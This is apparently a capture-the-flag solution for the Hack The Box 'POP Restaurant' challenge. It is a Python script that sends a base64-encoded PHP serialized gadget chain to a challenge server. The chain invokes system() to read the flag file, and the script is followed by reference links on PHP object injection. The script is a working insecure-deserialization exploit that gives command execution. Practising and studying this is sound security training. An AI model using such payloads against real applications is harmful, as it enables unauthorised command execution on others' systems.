```bash
python3 exploit.py
```
```bash
import re
import requests

url = "http://94.237.123.87:39567/order.php"

headers = {
    "Cookie": "PHPSESSID=df0b22519244ec847030ef5cebab356c"
}

data = {
    "data": "Tzo1OiJQaXp6YSI6Mzp7czo1OiJwcmljZSI7TjtzOjY6ImNoZWVzZSI7TjtzOjQ6InNpemUiO086OToiU3BhZ2hldHRpIjozOntzOjU6InNhdWNlIjtPOjg6IkljZUNyZWFtIjoyOntzOjc6ImZsYXZvcnMiO086MjE6IlxIZWxwZXJzXEFycmF5SGVscGVycyI6NDp7aTowO2k6MDtpOjE7YToxOntpOjA7czoyNjoiY2F0IC9wQmhmTUJRbHU5dVRfZmxhZy50eHQiO31pOjI7YToxOntzOjg6ImNhbGxiYWNrIjtzOjY6InN5c3RlbSI7fWk6MztOO31zOjc6InRvcHBpbmciO047fXM6Nzoibm9vZGxlcyI7TjtzOjc6InBvcnRpb24iO047fX0K"
}

response = requests.post(url, headers=headers, data=data, allow_redirects=False)
match = re.findall(r"HTB\{.*?\}", response.text)
if response.status_code == 302:
    if match:
        print(f"[+] FLAG FOUND: {match}")
    else:
        print(response.text)
        print("[-] No HTB flag found in response.")
else:
    print("[-] Request failed, check the URL or session.")
```


### Ctf
- https://app.hackthebox.com/challenges/POP%2520Restaurant
### Reference
- https://vickieli.dev/insecure%20deserialization/exploiting-php-deserialization/
- https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection
- https://medium.com/@abdallahomaratya0/pop-restaurant-challenge-htb-b10989577596



